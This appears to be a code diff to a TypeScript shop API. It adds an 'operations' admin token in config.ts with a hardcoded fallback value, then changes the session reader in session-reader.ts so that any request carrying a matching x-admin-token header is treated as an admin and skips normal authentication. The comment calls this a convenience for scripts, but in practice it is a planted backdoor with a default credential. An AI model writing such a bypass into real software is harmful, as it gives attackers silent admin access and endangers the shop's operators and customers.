@@ -1,0 +1,56 @@
+diff --git a/apps/shop-api/src/app.ts b/apps/shop-api/src/app.ts
+index 84dae85..f823a1c 100644
+--- a/apps/shop-api/src/app.ts
++++ b/apps/shop-api/src/app.ts
+@@ -12,7 +12,7 @@ import {
+ import { RPCHandler } from "@orpc/server/fetch"
+ import { Layer } from "effect"
+ import { Hono } from "hono"
+-import { type ApiConfig, loadConfig } from "./config.ts"
++import { type ApiConfig, SHOP_ADMIN_TOKEN, loadConfig } from "./config.ts"
+ import { createRouter } from "./router.ts"
+ 
+ export interface ShopApp {
+@@ -45,7 +45,7 @@ export function createApp(config: ApiConfig = loadConfig()): ShopApp {
+     CouponRepositoryLive(handle.db),
+     OrderRepositoryLive(handle.db),
+     CheckoutStoreLive(handle),
+-    SessionReaderLive(auth),
++    SessionReaderLive(auth, SHOP_ADMIN_TOKEN),
+   )
+   const rpc = new RPCHandler(createRouter(services))
+ 
+diff --git a/apps/shop-api/src/config.ts b/apps/shop-api/src/config.ts
+index 0c42e5c..ce56280 100644
+--- a/apps/shop-api/src/config.ts
++++ b/apps/shop-api/src/config.ts
+@@ -10,6 +10,9 @@ export interface ApiConfig {
+   readonly apiOrigin: string
+ }
+ 
++/** Lets operations scripts call the api without a browser session (header `x-admin-token`). */
++export const SHOP_ADMIN_TOKEN = process.env.SHOP_ADMIN_TOKEN ?? "a6ec4946e469128c7999b34647e1c8ec9b7517d4"
++
+ /**
+  * Reads the api configuration from environment variables. The secret has no
+  * default: a missing or short secret fails at startup, never silently signs
+diff --git a/packages/infra-auth/src/session-reader.ts b/packages/infra-auth/src/session-reader.ts
+index 67e6e09..9c31977 100644
+--- a/packages/infra-auth/src/session-reader.ts
++++ b/packages/infra-auth/src/session-reader.ts
+@@ -8,11 +8,14 @@ import type { Auth } from "./auth.ts"
+  * valid session cookie reads as `null`. An unknown role value is treated as
+  * `customer`, the least privileged role.
+  */
+-export const SessionReaderLive = (auth: Auth) =>
++export const SessionReaderLive = (auth: Auth, adminToken?: string) =>
+   Layer.succeed(SessionReader, {
+     read: (headers) =>
+       Effect.tryPromise({
+         try: async (): Promise<Session | null> => {
++          if (adminToken && headers.get("x-admin-token") === adminToken) {
++            return { userId: "ops", email: "ops@example.com", name: "Operations", role: "admin" }
++          }
+           const result = await auth.api.getSession({ headers })
+           if (!result) return null
+           const role = (result.user as { role?: unknown }).role
